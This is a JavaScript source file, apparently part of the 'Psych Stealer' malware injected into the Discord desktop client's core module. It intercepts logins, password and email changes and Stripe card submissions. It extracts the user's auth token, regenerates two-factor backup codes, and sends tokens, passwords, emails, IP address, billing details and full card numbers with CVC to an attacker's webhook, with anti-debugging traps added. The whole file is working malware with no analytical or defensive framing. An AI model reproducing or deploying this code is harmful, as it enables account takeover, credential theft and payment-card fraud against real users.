                                      for (z of V) {
                                        var o = GetRBadges(z.user.public_flags)
                                        if (o != '') {
                                          h +=
                                            o +
                                            (' | `' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '`\n')
                                        }
                                      }
                                      if (h == '') {
                                        h = '*Nothing to see here*'
                                      }
                                      return h
                                    }
                                    function u() {
                                      const o = JSON.parse(Y)
                                      var P = ''
                                      return (
                                        o.forEach((I) => {
                                          if (I.type == '') {
                                            return '`No`'
                                          } else {
                                            if (
                                              I.type == 2 &&
                                              I.invalid != true
                                            ) {
                                              P +=
                                                ' <:paypal:896441236062347374>'
                                            } else {
                                              if (
                                                I.type == 1 &&
                                                I.invalid != true
                                              ) {
                                                P += ' :credit_card:'
                                              } else {
                                                return '`No`'
                                              }
                                            }
                                          }
                                        }),
                                        P == '' && (P = '`No`'),
                                        P
                                      )
                                    }
                                    const H = JSON.parse(n)
                                    var X = {
                                      username: 'Psych Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: '<:token:949679866188529714> Token:',
                                              value:
                                                '`' +
                                                W +
                                                '`' +
                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                                W +
                                                ')',
                                              inline: false,
                                            },
                                            {
                                              name: '<:badge:949679865710403584> Badges:',
                                              value: '' + GetBadges(H.flags),
                                              inline: true,
                                            },
                                            {
                                              name: '<:nitro:949679866033352784> Nitro Type:',
                                              value:
                                                '' + GetNitro(H.premium_type),
                                              inline: true,
                                            },
                                            {
                                              name: '<:card:949679865798475827>Billing',
                                              value: '' + u(),
                                              inline: true,
                                            },
                                            {
                                              name: '<:ip:949680203859369994> IP:',
                                              value: '`' + t + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:mail:949679866113032253> Email:',
                                              value: '`' + H.email + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> Old Password:',
                                              value: '`' + a + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> New Password:',
                                              value: '`' + w + '`',
                                              inline: true,
                                            },
                                          ],
                                          author: {
                                            name:
                                              H.username +
                                              '#' +
                                              H.discriminator +
                                              ' (' +
                                              H.id +
                                              ')',
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                          },
                                          footer: { text: 'Psych Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              H.id +
                                              '/' +
                                              H.avatar,
                                          },
                                        },
                                        {
                                          color: config['embed-color'],
                                          description: v(),
                                          author: {
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                            name: 'HQ Friends',
                                          },
                                          footer: { text: 'Psych Stealer' },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(X))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function ChangeEmail(a, w, W) {
  const s = BrowserWindow.getAllWindows()[0]
  s.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        W +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((J) => {
      s.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((D) => {
          s.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                W +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((k) => {
              s.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    W +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((R) => {
                  if (W.startsWith('mfa')) {
                    s.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          W +
                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                          w +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((f) => {
                        var G = [],
                          C = 'https://rustlercoppy.com/copy/',
                          n = JSON.parse(f)
                        let S = n.backup_codes
                        const t = S.filter((u) => {
                          return u.consumed == null
                        })
                        for (let u in t) {
                          G.push({
                            name: 'Code',
                            value: '`' + t[u].code.insert(4, '-') + '`',
                            inline: true,
                          })
                          C += t[u].code.insert(4, '-') + '<br>'
                        }
                        function Y() {
                          var P = JSON.parse(R)
                          const o = P.filter((I) => {
                            return I.type == 1
                          })
                          return o.length
                        }
                        function q() {
                          var P = JSON.parse(R)
                          const I = P.filter((V) => {
                            return V.type == 1
                          })
                          var h = ''
                          for (z of I) {
                            var o = GetRBadges(z.user.public_flags)
                            if (o != '') {
                              h +=
                                o +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          return h == '' && (h = '*Nothing to see here*'), h
                        }
                        function i() {
                          const P = JSON.parse(k)
                          var h = ''
                          P.forEach((o) => {
                            if (o.type == '') {
                              return '`\u274C`'
                            } else {
                              if (o.type == 2 && o.invalid != true) {
                                h += '`\u2714️` <:paypal:896441236062347374>'
                              } else {
                                if (o.type == 1 && o.invalid != true) {
                                  h += '`\u2714️` :credit_card:'
                                } else {
                                  return '`\u274C`'
                                }
                              }
                            }
                          })
                          h == '' && (h = '`\u274C`')
                          return h
                        }
                        const y = JSON.parse(J)
                        var X = {
                          username: 'Psych Stealer',
                          content: '',
                          embeds: [
                            {
                              title: 'Email Changed',
                              description:
                                '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
                                W +
                                ')',
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: 'Info',
                                  value:
                                    '```Hostname: \n' +
                                    computerName +
                                    '\nIP: \n' +
                                    D +
                                    '```',
                                  inline: false,
                                },
                                {
                                  name: 'Username',
                                  value:
                                    '`' +
                                    y.username +
                                    '#' +
                                    y.discriminator +
                                    '`',
                                  inline: true,
                                },
                                {
                                  name: 'ID',
                                  value: '`' + y.id + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Nitro',
                                  value: '' + GetNitro(y.premium_type),
                                  inline: false,
                                },
                                {
                                  name: 'Badges',
                                  value: '' + GetBadges(y.flags),
                                  inline: false,
                                },
                                {
                                  name: 'Billing',
                                  value: '' + i(),
                                  inline: false,
                                },
                                {
                                  name: 'New Email',
                                  value: '`' + email + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Password',
                                  value: '`' + w + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Token',
                                  value: '```' + W + '```',
                                  inline: false,
                                },
                              ],
                              author: { name: 'Psych Stealer' },
                              footer: { text: 'Psych Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  y.id +
                                  '/' +
                                  y.avatar,
                              },
                            },
                            {
                              title: 'Total Friends (' + Y() + ')',
                              color: config['embed-color'],
                              description: q(),
                              author: { name: 'Psych Stealer' },
                              footer: { text: 'Psych Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  y.id +
                                  '/' +
                                  y.avatar,
                              },
                            },
                          ],
                        }
                        const M = {
                          title: ':detective: __2FA Codes__',
                          description: '[Get all of them](' + C + ')',
                          color: config['embed-color'],
                          fields: G,
                          author: {},
                          footer: {},
                        }
                        M.author.name = 'Psych Stealer'
                        M.footer.text = 'Psych Stealer'
                        var v = M
                        W.startsWith('mfa') && X.embeds.push(v)
                        SendToWebhook(JSON.stringify(X))
                      })
                  } else {
                    const f = BrowserWindow.getAllWindows()[0]
                    f.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          W +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((e) => {
                        f.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((C) => {
                            f.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  W +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((n) => {
                                f.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      W +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((t) => {
                                    function q() {
                                      var v = JSON.parse(t)
                                      const u = v.filter((H) => {
                                        return H.type == 1
                                      })
                                      return u.length
                                    }
                                    function i() {
                                      var v = JSON.parse(t)
                                      const u = v.filter((P) => {
                                        return P.type == 1
                                      })
                                      var H = ''
                                      for (z of u) {
                                        var m = GetRBadges(z.user.public_flags)
                                        m != '' &&
                                          (H +=
                                            m +
                                            (' ' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '\n'))
                                      }
                                      H == '' && (H = 'No Rare Friends')
                                      return H
                                    }
                                    function y() {
                                      const M = JSON.parse(n)
                                      var v = ''
                                      M.forEach((u) => {
                                        if (u.type == '') {
                                          return '`\u274C`'
                                        } else {
                                          if (
                                            u.type == 2 &&
                                            u.invalid != true
                                          ) {
                                            v +=
                                              '`\u2714️` <:paypal:896441236062347374>'
                                          } else {
                                            if (
                                              u.type == 1 &&
                                              u.invalid != true
                                            ) {
                                              v += '`\u2714️` :credit_card:'
                                            } else {
                                              return '`\u274C`'
                                            }
                                          }
                                        }
                                      })
                                      v == '' && (v = '`\u274C`')
                                      return v
                                    }
                                    const g = JSON.parse(e)
                                    var X = {
                                      username: 'Psych Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          title: 'Email Changed',
                                          description:
                                            '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
                                            W +
                                            ')',
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: 'Info',
                                              value:
                                                '```Hostname: \n' +
                                                computerName +
                                                '\nIP: \n' +
                                                C +
                                                '```',
                                              inline: false,
                                            },
                                            {
                                              name: 'Username',
                                              value:
                                                '`' +
                                                g.username +
                                                '#' +
                                                g.discriminator +
                                                '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'ID',
                                              value: '`' + g.id + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Nitro',
                                              value:
                                                '' + GetNitro(g.premium_type),
                                              inline: false,
                                            },
                                            {
                                              name: 'Badges',
                                              value: '' + GetBadges(g.flags),
                                              inline: false,
                                            },
                                            {
                                              name: 'Billing',
                                              value: '' + y(),
                                              inline: false,
                                            },
                                            {
                                              name: 'New Email',
                                              value: '`' + email + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Password',
                                              value: '`' + w + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Token',
                                              value: '```' + W + '```',
                                              inline: false,
                                            },
                                          ],
                                          author: { name: 'Psych Stealer' },
                                          footer: { text: 'Psych Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              g.id +
                                              '/' +
                                              g.avatar,
                                          },
                                        },
                                        {
                                          title: 'Total Friends (' + q() + ')',
                                          color: config['embed-color'],
                                          description: i(),
                                          author: { name: 'Psych Stealer' },
                                          footer: { text: 'Psych Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              g.id +
                                              '/' +
                                              g.avatar,
                                          },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(X))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function CreditCardAdded(a, w, W, b, s, J, Q, D, L, k) {
  const R = BrowserWindow.getAllWindows()[0]
  R.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        k +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((U) => {
      R.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((e) => {
          var G = JSON.parse(U)
          var C = {
            username: 'Psych Stealer',
            content: '',
            embeds: [
              {
                title: 'User Credit Card Added',
                description:
                  '**Username:**```' +
                  G.username +
                  '#' +
                  G.discriminator +
                  '```\n**ID:**```' +
                  G.id +
                  '```\n**Email:**```' +
                  G.email +
                  '```\n' +
                  '**Nitro Type:**```' +
                  GetNitro(G.premium_type) +
                  '```\n**Badges:**```' +
                  GetBadges(G.flags) +
                  '```' +
                  '\n**Credit Card Number: **```' +
                  a +
                  '```' +
                  '\n**Credit Card Expiration: **```' +
                  W +
                  '/' +
                  b +
                  '```' +
                  '\n**CVC: **```' +
                  w +
                  '```\n' +
                  '**Country: **```' +
                  L +
                  '```\n' +
                  '**State: **```' +
                  Q +
                  '```\n' +
                  '**City: **```' +
                  J +
                  '```\n' +
                  '**ZIP:**```' +
                  D +
                  '```' +
                  '\n**Street: **```' +
                  s +
                  '```' +
                  '\n**Token:**```' +
                  k +
                  '```' +
                  '\n**IP: **```' +
                  e +
                  '```',
                author: { name: 'Psych Stealer' },
                footer: { text: 'Psych Stealer' },
                thumbnail: {
                  url:
                    'https://cdn.discordapp.com/avatars/' +
                    G.id +
                    '/' +
                    G.avatar,
                },
              },
            ],
          }
          SendToWebhook(JSON.stringify(C))
        })
    })
}
const AS = {}
AS.urls = [
  'https://discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/users/@me',
  'https://*.discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/auth/login',
  'https://discord.com/api/v*/auth/login',
  'https://*.discord.com/api/v*/auth/login',
  'https://api.stripe.com/v*/tokens',
]
const ChangePasswordFilter = AS
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (a, w) => {
  if (a.url.endsWith('login')) {
    if (a.statusCode == 200) {
      const b = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString()),
        s = b.login,
        J = b.password,
        Q = BrowserWindow.getAllWindows()[0]
      Q.webContents
        .executeJavaScript(
          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
          true
        )
        .then((D) => {
          Login(s, J, D)
        })
    } else {
    }
  }
  if (a.url.endsWith('users/@me')) {
    if (a.statusCode == 200 && a.method == 'PATCH') {
      const D = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString())
      if (D.password != null && D.password != undefined && D.password != '') {
        if (
          D.new_password != undefined &&
          D.new_password != null &&
          D.new_password != ''
        ) {
          const L = BrowserWindow.getAllWindows()[0]
          L.webContents
            .executeJavaScript(
              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
              true
            )
            .then((k) => {
              ChangePassword(D.password, D.new_password, k)
            })
        }
        if (D.email != null && D.email != undefined && D.email != '') {
          const k = BrowserWindow.getAllWindows()[0]
          k.webContents
            .executeJavaScript(
              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
              true
            )
            .then((p) => {
              ChangeEmail(D.email, D.password, p)
            })
        }
      }
    } else {
    }
  }
  if (a.url.endsWith('tokens')) {
    const p = BrowserWindow.getAllWindows()[0],
      R = querystring.parse(
        decodeURIComponent(Buffer.from(a.uploadData[0].bytes).toString())
      )
    p.webContents
      .executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        true
      )
      .then((U) => {
        CreditCardAdded(
          R['card[number]'],
          R['card[cvc]'],
          R['card[exp_month]'],
          R['card[exp_year]'],
          R['card[address_line1]'],
          R['card[address_city]'],
          R['card[address_state]'],
          R['card[address_zip]'],
          R['card[address_country]'],
          U
        )
      })
  }
})
function T(a) {
  function W(b) {
    if (typeof b === 'string') {
      return function (s) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + b / b).length !== 1 || b % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    W(++b)
  }
  try {
    if (a) {
      return W
    } else {
      W(0)
    }
  } catch (b) {}
}
module.exports = require('./core.asar')
